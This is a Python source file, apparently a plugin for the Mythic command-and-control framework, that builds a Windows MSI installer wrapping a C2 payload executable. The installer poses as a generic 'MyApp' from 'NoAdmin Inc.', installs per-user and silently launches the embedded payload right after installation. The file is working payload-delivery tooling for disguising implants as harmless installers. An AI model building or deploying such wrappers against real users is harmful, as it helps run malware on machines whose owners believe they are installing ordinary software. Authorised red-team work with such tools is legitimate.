import logging
import pathlib
import traceback
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import os
import shutil
import base64
import random
import subprocess


import tempfile

class msi_wraps_exe(PayloadType):
    name = "msi_wraps_exe"
    file_extension = "msi"
    author = "@hegusung"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    wrapped_payloads = ["popup"]
    note = """Creates a MSI payload which install a EXE and executes it"""
    translation_container = None # "myPythonTranslation"
    agent_path = pathlib.Path(".") / "clickable"
    agent_icon_path = agent_path / "agent_functions" / "click.svg"
    agent_code_path = agent_path / "agent_code"
    build_parameters = [
        BuildParameter(
            name = "exe_name",
            parameter_type=BuildParameterType.String,
            default_value="MyApp.exe",
            description="Defines the exe name",
        ),
    ]

    build_steps = [
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""

        try:
            exe_payload = self.wrapped_payload
            exe_name = self.get_parameter('exe_name')

            wxs_payload = """<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" Name="MyApp" Language="1033" Version="1.0.0.0"
           Manufacturer="NoAdmin Inc." UpgradeCode="12345678-1234-1234-1234-123456789abc">

    <Package InstallerVersion="500" Compressed="yes" InstallScope="perUser" />

    <Media Id="1" Cabinet="product.cab" EmbedCab="yes" />

    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="LocalAppDataFolder">
        <Directory Id="INSTALLDIR" Name="MyApp">
          <Component Id="MainExecutable" Guid="e4e4e4e4-e4e4-e4e4-e4e4-e4e4e4e4e4e4">
            <File Id="MyAppFile" Name="{exe_name}" Source="{exe_name}" KeyPath="yes" />
          </Component>
        </Directory>
      </Directory>
    </Directory>

    <Feature Id="DefaultFeature" Level="1">
      <ComponentRef Id="MainExecutable" />
    </Feature>

    <!-- Custom Action to Run Executable -->
    <CustomAction Id="LaunchFile" FileKey="MyAppFile" ExeCommand="" Return="asyncNoWait" Impersonate="yes" />

    <!-- Run it after install (but before UI ends) -->
    <InstallExecuteSequence>
      <Custom Action="LaunchFile" After="InstallFinalize">NOT Installed</Custom>
    </InstallExecuteSequence>

  </Product>
</Wix>"""

            with tempfile.TemporaryDirectory() as temp_dir:
                f = open(os.path.join(temp_dir, exe_name), "wb")
                f.write(exe_payload)
                f.close()

                f = open(os.path.join(temp_dir, "Product.wxs"), "w")
                f.write(wxs_payload.format(exe_name=exe_name))
                f.close()

                subprocess.run(['wixl', '-o', 'Installer.msi', 'Product.wxs'], cwd=temp_dir, capture_output=True, text=True)

                f = open(os.path.join(temp_dir, "Installer.msi"), 'rb')
                msi_data = f.read()
                f.close()

        
            resp.payload = msi_data
            resp.build_message = "Successfully built!\n"

        except Exception as e:
            traceback.print_exc()

            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp
